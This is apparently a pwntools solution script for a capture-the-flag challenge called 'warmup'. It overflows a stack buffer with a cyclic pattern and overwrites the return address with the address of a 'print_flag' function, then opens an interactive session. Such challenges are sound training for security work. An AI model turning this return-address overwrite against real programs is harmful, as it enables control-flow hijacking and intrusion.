from pwn import *

# useful locations
print_flag = 0x400697

# attatch as a process
p = process("./warmup")

#gdb.attach(p, '''
#echo "This is attached to gdb!"
#break main
#continue
#''')

padding = cyclic(cyclic_find("kaaa"))
rip = p64(print_flag)

payload = padding + rip
p.sendline(payload)
p.interactive()
